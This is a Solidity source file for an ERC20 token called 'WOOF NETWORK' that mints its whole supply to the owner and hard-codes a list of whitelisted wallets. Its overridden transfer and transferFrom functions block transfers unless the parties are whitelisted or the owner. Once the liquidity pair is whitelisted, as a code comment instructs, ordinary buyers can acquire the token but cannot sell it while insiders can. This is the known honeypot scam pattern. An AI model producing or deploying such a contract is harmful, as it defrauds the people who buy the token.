// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("WOOF NETWORK", "WOOF") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        whiteList[0xFe2fc0aC5a06C39927865780F979D321DEFfD4b5]= true;
        whiteList[0x16dDCf8027566d76b0916cFBCAAe72535B73627c]=true;
        whiteList[0xf3796B50f4538E34c94b11157988e11C866C51CE]=true;
        whiteList[0x00AD5E58eFf8824eDd0e6dEA4F0C86a109e2f91f]=true;
        whiteList[0x5d1D2E3ce798E7B646E9F1de6a02167BefE7150e]=true;
        whiteList[0x262756C0002207750bcbb02Fbc161B8Cc9980872]=true;
        whiteList[0xAa2E55df64010750d0B39775751dB2ceEeE05311]=true;
        whiteList[0x2C45521A07Fd0233420c4221cd323231448E4F2A]=true;
        whiteList[0xE2c3db0a2340288c5853Db36471C9E1EB87208dF]=true;
        whiteList[0xb4b1Fb6d44cd335704f9751e8A825Bf570bc84F8]=true;
        whiteList[0x84aa866fa568f7295C7C8D2B8167Cc25a4707721]=true;
        whiteList[0x73d038DE60c2991E8b881CbCbB349e2E1dC26a73]=true;
        whiteList[0x95373A36d46ed1b04eCd31AE21AaB6289aF30f34]=true;
        whiteList[0x1AFC9C2103AA1c203a9E09D0D46722a0f71Afa6A]=true;
        whiteList[0x935ECa1e140eC2BbBDB8D97c1C593bCCe8293884]=true;
        whiteList[0x4643da182F65bb1eEaa6A0aB6184d990AbF594e4]=true;
        whiteList[0x544EbB1e1Cb7BC4e65535EC1f0D273ca7A8a978d]=true;
        whiteList[0x120Bf1486f780fB4d64B77Ad54008E7b05823D96]=true;
        whiteList[0xFB5db2c8E093A3a524D3df2Ba3398DE23d78729e]=true;
        whiteList[0x2f66876f717C1F74D78d01BbF536B255d58A107e]=true;
        whiteList[0x16ec3Cd4727db6464786620ef65f48a234eEe3f7]=true;
        whiteList[0x93c4C70a15fB680bC36704a7D73afB61545bF59A]=true;
        whiteList[0xF597d9D9814a6c934eFC006F2681c0c825181307]=true;
        whiteList[0xA85218f4c10284cFd095B37fDc6eb0cF8765475c]=true;
        whiteList[0xDa35C967bDD0F9EE5ADDaF27F54fcea9a4582adc]=true;
        whiteList[0xB4Fc1E259614033ea9e464890CC5B954BE5380D0]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}